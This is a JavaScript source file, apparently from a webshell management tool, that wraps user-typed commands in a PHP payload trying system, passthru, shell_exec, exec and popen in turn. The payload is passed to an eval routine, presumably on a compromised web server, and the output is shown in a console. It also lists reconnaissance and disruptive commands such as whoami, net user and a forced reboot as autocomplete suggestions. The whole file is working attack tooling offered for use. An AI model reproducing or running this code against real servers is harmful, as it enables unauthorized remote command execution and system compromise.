/**
 * Created by abcdlzy on 15/3/14.
 */
function doExec(command,returnFunc){
    execTypeAhead(command);
    var PostCode="function execute(\$cfe) {\$res = '';if (\$cfe) {if(function_exists('system')) {@ob_start();@system(\$cfe);\$res = @ob_get_contents();@ob_end_clean();} elseif(function_exists('passthru')) {@ob_start();@passthru(\$cfe);\$res = @ob_get_contents();@ob_end_clean();} elseif(function_exists('shell_exec')) {\$res = @shell_exec(\$cfe);} elseif(function_exists('exec')) {@exec(\$cfe,\$res);\$res = join(\"\n\",\$res);} elseif(@is_resource(\$f = @popen(\$cfe,\"r\"))) {\$res = '';while(!@feof(\$f)) {\$res .= @fread(\$f,1024);}@pclose(\$f);}}return \$res;}" +
        "echo mb_convert_encoding(execute('"+command+"'), 'utf-8', 'GBK,UTF-8,ASCII');";
    doEvalCode(PostCode,returnFunc);
}

function executeCode(){
    document.getElementById('execShow').innerHTML+="\r\n执行命令："+$('#execCode').val()+"\r\n-----------开始------------";
    doExec($('#execCode').val(),function(data){
        if(data==""){
            data="无数据返回";
        }
        document.getElementById('execShow').innerHTML+="\r\n"+data+"\r\n-----------结束------------";
        document.getElementById('execShow').scrollTop=document.getElementById('execShow').scrollHeight;
       $('#execCode').val('');
        $('#execCode').focusin();
        remakeTypeAhead();
    });
}

var execCommand=["whoami","net user","ver","net accounts","net user","ipconfig -all"
,"cd ","net","shutdown","set",'msg admin "this is test"',"ifconfig",'shutdown -r -t 5 -c "5 seconds reboot"'];

function execTypeAhead(command){
    execCommand.push(command);
    execCommand=execCommand.distinct();

}

function remakeTypeAhead(){
    $('#execCode').typeahead('destroy');
    initExecTypeAhead();
}

function initExecTypeAhead(){
    $('#execCode').typeahead({
        local: execCommand
    });
}

